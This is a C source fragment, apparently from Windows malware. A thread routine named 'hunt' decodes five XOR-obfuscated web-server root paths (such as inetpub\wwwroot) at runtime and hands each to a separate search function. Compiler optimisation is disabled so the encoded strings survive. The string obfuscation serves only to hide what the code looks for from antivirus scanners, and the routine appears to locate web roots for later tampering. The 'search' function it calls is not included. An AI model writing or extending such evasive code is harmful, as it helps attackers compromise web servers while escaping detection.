#include "data_globals.h"
#pragma optimize("", off)

static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}


#include <stdio.h>
#include <stdlib.h>

DWORD WINAPI hunt(LPVOID param)
{
    (void)param;   // unused

    // "\\wwwroot" with key 0x3E
    volatile char sz_str_1[] = {
        '\\'^0x3E, 'w'^0x3E, 'w'^0x3E, 'w'^0x3E, 'r'^0x3E,
        'o'^0x3E, 'o'^0x3E, 't'^0x3E, 0x00^0x3E
    };
    xor_decrypt(sz_str_1, sizeof(sz_str_1), 0x3E);
    search((LPCSTR)sz_str_1);

    // "\\www root" with key 0x7A
    volatile char sz_str_2[] = {
        '\\'^0x7A, 'w'^0x7A, 'w'^0x7A, 'w'^0x7A, ' '^0x7A,
        'r'^0x7A, 'o'^0x7A, 'o'^0x7A, 't'^0x7A, 0x00^0x7A
    };
    xor_decrypt(sz_str_2, sizeof(sz_str_2), 0x7A);
    search((LPCSTR)sz_str_2);

    // "\\inetpub\\wwwroot" with key 0x1F
    volatile char sz_str_3[] = {
        '\\'^0x1F, 'i'^0x1F, 'n'^0x1F, 'e'^0x1F, 't'^0x1F,
        'p'^0x1F, 'u'^0x1F, 'b'^0x1F, '\\'^0x1F, 'w'^0x1F,
        'w'^0x1F, 'w'^0x1F, 'r'^0x1F, 'o'^0x1F, 'o'^0x1F,
        't'^0x1F, 0x00^0x1F
    };
    xor_decrypt(sz_str_3, sizeof(sz_str_3), 0x1F);
    search((LPCSTR)sz_str_3);

    // "\\inetpub\\www root" with key 0x5C
    volatile char sz_str_4[] = {
        '\\'^0x5C, 'i'^0x5C, 'n'^0x5C, 'e'^0x5C, 't'^0x5C,
        'p'^0x5C, 'u'^0x5C, 'b'^0x5C, '\\'^0x5C, 'w'^0x5C,
        'w'^0x5C, 'w'^0x5C, ' '^0x5C, 'r'^0x5C, 'o'^0x5C,
        'o'^0x5C, 't'^0x5C, 0x00^0x5C
    };
    xor_decrypt(sz_str_4, sizeof(sz_str_4), 0x5C);
    search((LPCSTR)sz_str_4);

    // "\\webshare\\wwwroot" with key 0x2A
    volatile char sz_str_5[] = {
        '\\'^0x2A, 'w'^0x2A, 'e'^0x2A, 'b'^0x2A, 's'^0x2A,
        'h'^0x2A, 'a'^0x2A, 'r'^0x2A, 'e'^0x2A, '\\'^0x2A,
        'w'^0x2A, 'w'^0x2A, 'w'^0x2A, 'r'^0x2A, 'o'^0x2A,
        'o'^0x2A, 't'^0x2A, 0x00^0x2A
    };
    xor_decrypt(sz_str_5, sizeof(sz_str_5), 0x2A);
    search((LPCSTR)sz_str_5);

    return 0;
}

#pragma optimize("", on)
